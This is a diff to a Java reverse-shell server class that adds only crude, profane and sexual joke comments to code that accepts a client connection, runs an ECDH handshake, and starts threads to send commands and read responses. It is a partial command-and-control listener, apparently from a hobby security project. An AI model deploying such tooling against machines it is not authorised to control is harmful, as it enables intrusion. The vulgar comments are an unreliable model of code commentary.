@@ -26,15 +26,15 @@ public class ReverseShellServer {
 
 	public void start() {
 		try {
-			setupServer();
-			waitForConnection();
-			setupStreams();
-			setupSecureConnection();
+			setupServer(); //Server port and stuff
+			waitForConnection(); //Wait for client
+			setupStreams(); //In and out streams
+			setupSecureConnection(); //Do the cool handshake so you know they're a homie
 
-			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey, nonce));
+			outputReceiver = new Thread(new ResponseHandler(dataIn, dataOut, clientSocket, encryptionKey, nonce)); //Handle those responses
 			outputReceiver.start();
 
-			inputHandler = new Thread(new CommandSender(dataOut, userInput, this, encryptionKey, nonce));
+			inputHandler = new Thread(new CommandSender(dataOut, userInput, this, encryptionKey, nonce)); //Send those commands like a dom
 			inputHandler.start();
 
 		} catch (IOException e) {
@@ -44,13 +44,13 @@ public class ReverseShellServer {
 
 	private void setupServer() throws IOException {
 		serverSocket = new ServerSocket(SERVER_PORT);
-		logger.log(Level.INFO, "[-] Server is running on port {0}", SERVER_PORT);
+		logger.log(Level.INFO, "[-] Server is running on port {0}", SERVER_PORT); //Port stuff, fuck yeah
 	}
 
 	private void waitForConnection() throws IOException {
-		logger.info("[-] Waiting for incoming connection...");
+		logger.info("[-] Waiting for incoming connection..."); //I'm waiting
 		clientSocket = serverSocket.accept();
-		logger.log(Level.INFO, "[-*] Connection established with {0}", clientSocket.getInetAddress());
+		logger.log(Level.INFO, "[-*] Connection established with {0}", clientSocket.getInetAddress()); //Gimme that ip
 	}
 
 	private void setupStreams() throws IOException {
@@ -61,30 +61,30 @@ public class ReverseShellServer {
 
 	private void setupSecureConnection() throws IOException {
 		try {
-			byte[] serverPrivateKey = ECDHKeyExchange.generatePrivateKey();
-			byte[] serverPublicKey = ECDHKeyExchange.generatePublicKey(serverPrivateKey);
+			byte[] serverPrivateKey = ECDHKeyExchange.generatePrivateKey(); //Key stuff
+			byte[] serverPublicKey = ECDHKeyExchange.generatePublicKey(serverPrivateKey); //More key stuff
 
-			dataOut.writeInt(serverPublicKey.length);
-			dataOut.write(serverPublicKey);
-			dataOut.flush();
+			dataOut.writeInt(serverPublicKey.length); //Give the client some of the key stuff
+			dataOut.write(serverPublicKey); //More giving the client key stuff
+			dataOut.flush(); //More flushing
 
-			int clientKeyLength = dataIn.readInt();
-			byte[] clientPublicKey = new byte[clientKeyLength];
-			dataIn.readFully(clientPublicKey);
+			int clientKeyLength = dataIn.readInt(); //Get the client's key stuff
+			byte[] clientPublicKey = new byte[clientKeyLength]; //More getting the client's key stuff
+			dataIn.readFully(clientPublicKey); //Maybe this is why I'm a virgin?
 
-			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(serverPrivateKey, clientPublicKey);
+			encryptionKey = ECDHKeyExchange.performECDHKeyExchange(serverPrivateKey, clientPublicKey); //Do the handshake like a fucking boss
 
-			logger.info("[-] Secure connection established using ECDH and ChaCha20 encryption.");
+			logger.info("[-] Secure connection established using ECDH and ChaCha20 encryption."); //Yeah, this is why I'm a virgin
 		} catch (IOException e) {
 			throw new IOException("Secure key exchange failed: " + e.getMessage(), e);
 		}
 	}
 
-	public Socket getClientSocket() {
+	public Socket getClientSocket() { //clientussy
 		return clientSocket;
 	}
 
-	public void cleanup() {
+	public void cleanup() { //Hell yeah
 		try {
 			if (outputReceiver != null && outputReceiver.isAlive()) {
 				outputReceiver.interrupt();
@@ -98,7 +98,7 @@ public class ReverseShellServer {
 		}
 	}
 
-	private void closeResources() throws IOException {
+	private void closeResources() throws IOException { //Wooooooo, I'm almost done writing comments
 		try {
 			if (userInput != null) {
 				userInput.close();
